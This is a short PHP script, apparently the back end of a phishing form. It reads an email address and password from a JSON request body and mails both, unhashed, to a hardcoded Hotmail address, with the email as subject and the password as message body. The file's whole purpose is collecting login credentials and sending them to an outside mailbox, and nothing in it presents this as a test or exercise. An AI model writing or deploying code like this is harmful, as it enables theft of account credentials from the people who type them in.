<?php
echo 'Enviando correo';

$postdata = file_get_contents("php://input");
    $request = json_decode($postdata);
    $email = $request->email;
    $pass = $request->pass;
    echo $email;


mail("juan92654200@hotmail.com",$email,   $pass);
?>